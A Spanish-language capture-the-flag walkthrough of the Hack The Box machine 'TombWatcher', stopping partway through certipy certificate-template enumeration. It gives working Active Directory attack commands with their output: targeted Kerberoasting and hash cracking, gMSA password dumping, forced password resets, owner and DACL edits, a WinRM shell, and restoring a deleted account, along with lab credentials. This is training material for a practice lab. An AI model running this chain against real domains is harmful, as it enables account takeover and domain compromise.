# HTB: TombWatcher

## Host: Windows
## IP: 10.10.11.72

### Credenciales:

* User: **henry**
* Password: **H3nry_987TGV!**

## Procedimiento y comandos
#### Paso 1: Enumeracion

* Nmap

```bash
nmap -A -v -p- -T4 -Pn -oX tombwatcher_tcp.scan 10.10.11.72 --webxml

Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-15 18:50:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-15T18:52:28+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
|_SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-15T18:52:26+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
|_SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-15T18:52:28+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
|_SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
|_SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
|_ssl-date: 2025-09-15T18:52:26+00:00; +3h59m59s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49732/tcp open  msrpc         Microsoft Windows RPC
49747/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-15T18:51:50
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 3h59m58s, deviation: 0s, median: 3h59m58s

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   201.18 ms 10.10.14.1
2   201.57 ms 10.10.11.72
```

* SMB

```bash
smbmap -H 10.10.11.72 -u users.txt -p pass.txt


```

* Bloodhound

```bash
bloodhound-python -u 'henry' -p 'H3nry_987TGV!' -d tombwatcher.htb -c All -ns 10.10.11.72 --zip
```

Encontramos de la salida de bloodhound lo siguiente:

```bash
henry -- WriteSPN --> alfred
alfred -- AddSelf --> Infrastructure
Infrastructure -- ReadGMSAPassword --> Ansible_dev
Ansible_dev -- ForceChangePassword --> sam
sam -- WriteOwner --> john
john -- GenericAll --> ADCS
```

1. **henry - WriteSPN -> alfred**
El usuario henry tiene permisos de WriteSPN sobre alfred.
👉 Eso significa que puede agregar/modificar SPNs en la cuenta de alfred.
Con ese permiso, puede hacer un Kerberoasting controlado (crear un SPN en alfred y solicitar un TGS para crackear la contraseña de alfred).

2.** alfred - AddSelf -> Infrastructure**
alfred puede agregarse a sí mismo en el grupo/objeto Infrastructure.
👉 Normalmente es un grupo o contenedor. Esto le da a alfred pertenencia allí, con los permisos asociados.

3. **Infrastructure - ReadGMSAPassword -> Ansible_dev**
Los miembros de Infrastructure pueden leer la contraseña del GMSA (Group Managed Service Account) Ansible_dev.
👉 Eso significa que una vez que alfred está en ese grupo, puede obtener la clave del GMSA Ansible_dev y autenticarse como él.

4.** Ansible_dev - ForceChangePassword -> sam**
Ansible_dev tiene permiso de ForceChangePassword sobre el usuario sam.
👉 Eso permite resetear la contraseña de sam sin conocer la actual, obteniendo control total sobre esa cuenta.

5. **sam - WriteOwner -> john**
sam puede cambiar el propietario de john (WriteOwner).
👉 Al ser dueño, puede otorgarse permisos más amplios sobre john.

6. **john - GenericAll -> ADCS**
Finalmente, john tiene GenericAll sobre ADCS.
👉 Eso es control total sobre el objeto ADCS (probablemente una CA - Certificate Authority).
Con esto se puede comprometer la CA corporativa, emitir certificados arbitrarios y, en la práctica, llegar al Domain Admin / Enterprise Admin.

#### Paso 2: Accesso inicial

* Targeted  Kerberoasting:

[Fuente](https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting)

> **importante** sincronizar el timezone con el DC 

```bash
ntpdate 10.10.11.72
```

Luego de intentar con impacket-GetUserSPNs confirmamos con ldapsearch que alfred no tiene SPNs por lo tanto debemos buscar una alternativa

```bash
impacket-GetUserSPNs -request -dc-ip 10.10.11.72 tombwatcher.htb/henry:'H3nry_987TGV!'                                           
/root/tombwatcher-venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

1. Despues de clonar el [repo](https://github.com/ShutdownRepo/targetedKerberoast) levantamos un entorno virtual e instalamos los requirements.txt

2. Ejecutamos el script:

```bash
python3 targetedKerberoast.py -d "tombwatcher.htb" -u "henry" -p 'H3nry_987TGV!' -v 
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$f663c9a24544b57830ab2c161d0b4aba$3c2b42fc49d25a291677c20100e32f752cc7be7411e2464b2be0ef2dfa1f2cc5459be56b5ae286138dbe0378fd23c7b5e90f2d2fcfdeb9f12130c8a2625948aceffb85d310e820271293ba05c7dc3a925a2cf900c3451cfbe5e90f1a3ab94a22d851ad77580b2ac995ca3a382d80be48d561f85826826af56b6f19c384270a8b4c05e5dc6205fd4d2c5bc4e6a668e56eacaa731ef73bbb5ab3ed9fec1200a4d1c5564e5fc5b10023269c456dd471145e415f027874bca5e53fed783b11d2db12acd2179670228261bee5daf4bae253ff7f16c38a8e3c74262ff6c452f7d70efe77b9ffd6bb1ebb0f5d7137af4ae4aa7e593d644d1ef11cf9d523c96316ba02f08aab8b90c57de604f517976880849887d0a703dd72f247421347e5edce3685c22d698a750d33184863fae51aa58aef15a14c7e510c92b95c6785a6c7cf03bb928b3bc58c38c445bcd8eb8a24c5419393b3d274b30acbf6caac0c97bb6bceec9f453f6ba63e9fc89d56420dabf6a62cac0308bad3c0ce93d2de46a87a798fc6157ef4986f17d8c19b40ca789843a7c5b580181c685fac407c17c6eda846e4ce3013e8eec2f0ae1cfbef46704a63f55008d4137ea4319a803e82cb23d97aa5139697d47c9ac941c0a8cbd670006a3c3717f0e647f850355c9e3c6c6493bc5c6800c853662d82bea81c725dc9c1dd9bc67f56c446924911b7b50fa99f4db32bddd3a44dcb809d907f8e3cda390333ec4ee331ee798e173737ba724f63f84439f6ab63bc5be4b9cd66829ad34653df318b447937df482c96c90b21a1e454368510bcab72f1f842577a6c148253fae07792ba28a2da909966af9bdf122b028b61a8fa8a387034e5e7d00c25a4fc1e4eddc9acb140769380aa2c25fce0414017170798d9f11f0c0181708322f051dc2408e0cc6dc6540e7617be31fa298e7f50f71cab4c580d5ad48a5f498913ecddb2349f2a59de5185e4b19ad165ca5c2de144813d877134a0bd35d335846e004f0ebd95974bb683b51a9a9f4124e58e03f1aac7f17726280bef7ab1a532585730da7539faa647d169e5708c4aa8f886912e2f6f82a8d2f405422e28a3cd06cacc7ee384c4abc6bb3433a31e31195f06de64fa8a824eafb43723e10a4bb2aecdd73acca70d426ad70aea962f1b7efaa207aac1d22efe047176bcf29d543f9eaa0537d60e32d5427ab0b771b28701c42868f56a019cafdb8c71e3d1c884a8f81478ff36315f9be5b881d9deaf24beb8ba8b95d3687f193586797586d1743b5ff591d7c0a36a0d5a896c8a5d1ade933cb0310bab635b3cbaea00910a962bb62643f5b043a1df9898e85f5e58daf18f4c5d5fc89b705de3e14bbe94e568ab3e658b64b06ca8673dfa70839c310f21f91bb7c85786bc04e20c2e890a92b3b854667639fcaea10ebbf57b8ca745e8f9c346d9a8952f83db420e703100697ac52e0b91840b8d093871fb030263
[VERBOSE] SPN removed successfully for (Alfred)
```
La diferencia con impacket-GetUserSPNs es que el script crea un SPN a nombre de alfred y luego lo elimina, lo que lo vulve vulnerable kerberoasting.

Comprobamos que alfred no tiene SPNs con ldapsearch:

```bash
ldapsearch -x -H ldap://10.10.11.72 -D 'henry@tombwatcher.htb' -w 'H3nry_987TGV!' -b "dc=tombwatcher,dc=htb" "(servicePrincipalName=*)" servicePrincipalName sAMAccountName
```

* Una vez obtenido el hash crackeamos:

1. hashcat -m

```bash
hashcat -h | grep -i "kerberos"                      
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
```

2. Crackeamos:

```bash
hashcat -m 13100 alfred.hash /usr/share/wordlists/rockyou.txt 

$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$3b0b07d06445bc05e2a2bf07eebaf8d7$377c8490ddec88d2ad8e11675ba65f03906307d27ba9d285cbf1774b698c2c4b3ddec67bb2535d922784dc80ca117bd03fdb0a56c9e936d5577d3a22e39cbea194b94b2bf5ac88cb13a858e95ba1651ad07aba7657b1d68979241468ac39cda8fe3bb73e82f2e8ea149c2fd8577b7eb7d1e6a5d0a236e778a0939a2f2a0c84e08e3083ad2503872dc13795c46ac53317c51b1a2cf3d804cecc58ff35716b938328ef8a418cd6108952792692fae4d2702ec715be151f9bf6158dd95a32595c15d34c89603feb9405383a1f012e7d620aefbfbf1af12483dafa06304a29a435442f04005549063538732537d97db93a0633483b5adab744ab66aefda86f5fe6576b379758760938d63c4975265b71afd6871483d5ccda47c79fce03cf637b005afe94213141c9c2c3405ddf751831f2b210ffdba0630de69ecc08fd445f8cf346f03f7d16b2f3b88cf86575e29e69f5092bff312678772f2d13bda9840029394f48bb608a5d475900ece60170cdcdb8f50cd1124274e3f0bfdf5f604374253e3edd7e352fa02f6f89269b9da4873b7e8e6314d312a675c47b41572d0f1a1737f92ac7f3efcdc4605ef911963c48c8cb84d17ee1ef2291d58f197c8d1961cfe0bb75dd83c3a9a0b92044388a7daed0cd31255b2073606b1c61077a5c99d30ea0c09d163caef968fabc9aad3cf53151a4daae66c9bfc55de4587a421ca86e1b8d4f9e50f965da242cb0588e522e0975a117468b5d97d9b31ca241d96b4e0474e5b1b58400a317de907f56ced0dfb9b6ba8bf08953c683192204f9e8e64dd1988f9bf325e080e218866c5d739fb5a92b4edc4c38ed85e7f2d701cfff5931ef5b92c0b88e1da8d8a77f78949327d084d30b577f1e44dccf92f569c6e82a958a35a979c49a582fcd286874485b0fbee7796c37744a07d95488feee4fb164345f57996c9199f90d8a541f25bcc4a9e0bffd5d6727de1bcddb4e230501507b125dbe0683f7600f67cfba7afbe5b88bb573e796fd9b848e89209f8884af9dc340c25b37c91917f0613b1397783b74ca0dbeb627211960dc512b793a533b1ff0e37f00744f53176c1d6d6d3da10d8fc494f21ea975019f1dd99b4b85620673c8f5d80e0934d012a0f0c2efcc2c440244c4d7f55f548546afedb88cdffa79f28cdd82d31bd2ecc8f98d2f689c55ae98cc35c6bbe1d0f3a29688be52358b1a21ea9b45bc0201ab128e70a3883182a5d5bcc02f3ef1bcba9d044089b41371d5ded901dbd4e38c34b6a113fde8392298dd5c36e03abe4c4a97bc10622ccb46067a3c9792406d7dc5ee0b8270ab31345117c97e7bb0de9df39a2d8228a0570e89421b1cc19b2776d236743ed1db6d26f3783f4b0f6ceed66caab9245bdfeedb3103bacdf15a807fa45d1a7f1bfc228148e5c742b14042c1a8d4440fccbe9ddbe587768edac94e4f2f7311d3a387500a69e815ab16fc90031e1f1abc37:basketball
                                                          
```

* alfred: basketball

Como vimos del analisis de bloodhound alfred tiene AddSelf en INFRASTRUCTURE:

```bash
bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u 'alfred' -p 'basketball' add groupMember 'Infrastructure' alfred                                                
[+] alfred added to Infrastructure
```

Una vez agregado alfred al grupo INFRASTRUCTURE buscamos dumpear o leer la contraseña del GMSA:

Una busqueda rapida nos lleva [aqui](https://github.com/micahvandeusen/gMSADumper)

Clonamos y le ejecutamos:

```bash
python3 gMSADumper.py -u 'alfred' -p 'basketball' -d tombwatcher.htb
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::4f46405647993c7d4e1dc1c25dd6ecf4
ansible_dev$:aes256-cts-hmac-sha1-96:2712809c101bf9062a0fa145fa4db3002a632c2533e5a172e9ffee4343f89deb
ansible_dev$:aes128-cts-hmac-sha1-96:d7bda16ace0502b6199459137ff3c52d
```

Una vez leido el password GMSA buscamos desde ansible_dev cambiar la contrasena de sam:

```bash
bloodyAD --dc-ip 10.10.11.72  -u 'ansible_dev$' -p ':4f46405647993c7d4e1dc1c25dd6ecf4' -d tombwatcher.htb set password sam 'Password123!'
[+] Password changed successfully!
```

Propagamos las credenciales de sam:

```bash
smbmap -H 10.10.11.72 -u 'sam' -p 'Password123!'       

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.11.72:445 Name: tombwatcher.htb           Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections 
```
Nada interesante por ahora, podemos continuar con el vector: henry → alfred → Infrastructure → Ansible_dev → sam → john → ADCS

Explotamos el privilegio de sam sobre john: [fuente](https://www.hackingarticles.in/abusing-ad-dacl-writeowner/)

```bash
impacket-owneredit -action write -new-owner 'sam' -target-dn 'CN=JOHN,CN=USERS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'sam':'Password123!' -dc-ip 10.10.11.72
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
```
Aseguramos control total sobre john:

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'sam' -target-dn 'CN=JOHN,CN=USERS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'sam':'Password123!' -dc-ip 10.10.11.72
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250915-222847.bak
[*] DACL modified successfully!
```

Cambiamos el password de john:

```bash
bloodyAD --dc-ip 10.10.11.72  -u 'sam' -p 'Password123!' -d tombwatcher.htb set password john 'Password123!'
[+] Password changed successfully!
```
Propagamos y nos conectamos por winrm:

```bash
evil-winrm -i 10.10.11.72 -u john -p 'Password123!'          
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents>
```

Obtenemos el flag user:

```bash
*Evil-WinRM* PS C:\Users\john\Documents> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\john\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/15/2025   3:27 PM             34 user.txt
*Evil-WinRM* PS C:\Users\john\Documents> type C:\Users\john\Desktop\user.txt
cda652ba04f599acc5b87e8152201362
*Evil-WinRM* PS C:\Users\john\Documents> 
```

#### Escalada de privilegios / Movimiento lateral

Continuamos con el vector y vamos a aprovechar los privilegios **GenericAll** que tiene john sobre ADCS

Necesitamos enumerar ADCS: 

```bash
certipy-ad find -u john -p 'Password123!' -target tombwatcher.htb -text -stdout 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: tombwatcher.htb.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The DNS query name does not exist: DC01.tombwatcher.htb.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
[*] Enumeration output:

# De los 33 certificados vemos uno con un SID que no puede cargar: 'S-1-5-21-1392491010-1358638721-2126982587-1111'
...

17
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
...

```

Desde la session de evil-winrm buscamos informacion sobre ese SID:

```bash
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter "objectSid -eq 'S-1-5-21-1392491010-1358638721-2126982587-1111'" -IncludeDeletedObjects -Properties *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
CN                              : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:07:04 PM
createTimeStamp                 : 11/16/2024 12:07:04 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:07:27 PM
modifyTimeStamp                 : 11/16/2024 12:07:27 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1111
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762504248946345
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13197
uSNCreated                      : 13186
whenChanged                     : 11/16/2024 12:07:27 PM
whenCreated                     : 11/16/2024 12:07:04 PM

```

Obtenemos un nombre de usuario: **cert_admin** pero parece ser que es un objeto borrado, por eso el mensaje:

```bash
[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
```

Para usar el objeto debemos restaurarlo, sacamos del CN:

* Restauramos:

```bash
Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
```

* Habilitamos

```bash
Enable-ADAccount -Identity cert_admin
```

* Cambiamos el password de **cert_admin**

```bash
Set-ADAccountPassword -Identity cert_admin -NewPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Reset
```

* Corroboramos:

```bash
Get-ADUser -Identity cert_admin


DistinguishedName : CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
Enabled           : True
GivenName         : cert_admin
Name              : cert_admin
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
SamAccountName    : cert_admin
SID               : S-1-5-21-1392491010-1358638721-2126982587-1111
Surname           : cert_admin
UserPrincipalName :
```

Enumeramos ADCS con certypy:

```bash
certipy-ad find -u cert_admin -p Password123! -dc-ip 10.10.11.72 -target-ip 10.10.11.72 -vulnerable -enable -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb                                                                                                                                                                              
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb                                                                                                                                                       
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC                                                                                                                                                                  
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00                                                                                                                                                                         
    Certificate Validity End            : 2123-11-16 00:57:48+00:00                                                                                                                                                                         
    Web Enrollment                                                                                                                                                                                                                          
      HTTP                                                                                                                                                                                                                                  
        Enabled                         : False                                                                                                                                                                                             
      HTTPS                                                                                                                                                                                                                                 
        Enabled                         : False                                                                                                                                                                                             
    User Specified SAN                  : Disabled                                                                                                                                                                                          
    Request Disposition                 : Issue                                                                                                                                                                                             
    Enforce Encryption for Requests     : Enabled                                                                                                                                                                                           
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy                                                                                                                                                      
    Permissions                                                                                                                                                                                                                             
      Owner                             : TOMBWATCHER.HTB\Administrators                                                                                                                                                                    
      Access Rights                                                                                                                                                                                                                         
        ManageCa                        : TOMBWATCHER.HTB\Administrators                                                                                                                                                                    
                                          TOMBWATCHER.HTB\Domain Admins                                                                                                                                                                     
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
